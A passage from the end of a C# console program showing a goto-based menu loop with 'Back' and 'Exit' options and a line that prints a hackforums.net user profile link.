                    Console.WriteLine("https://hackforums.net/member.php?action=profile&uid=3934403");
                    Console.WriteLine("");
                    Console.WriteLine("-Back");
                    switch (Console.ReadLine())
                    {
                        case "Back":
                            goto Start;
                        default:
                            goto Start;
                    }

                case "Exit":
                    break;

                default:
                    Console.Clear();
                    goto Start;
            }
        }
    }
}
